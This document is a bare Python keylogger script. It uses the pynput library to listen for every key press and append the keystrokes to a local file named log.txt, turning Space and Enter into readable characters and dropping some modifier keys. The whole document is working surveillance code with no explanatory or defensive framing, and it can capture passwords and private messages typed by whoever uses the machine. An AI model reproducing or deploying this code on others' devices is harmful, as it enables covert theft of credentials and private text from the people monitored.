from pynput.keyboard import Listener

def add_to_file(key):
    keydata  = str(key)
    keydata = keydata.replace('\'','')
    if keydata.find('Key.caps_lock') == 0:
        keydata = ''
    if keydata.find('Key.shift_r') == 0:
        keydata = ''
    if keydata.find('Key.space') == 0:
        keydata = ' '
    if keydata.find('Key.enter') == 0:
        keydata = '\n'


    with open('log.txt','a') as f:
        f.write(keydata)

with Listener(on_press = add_to_file) as l:
    l.join()
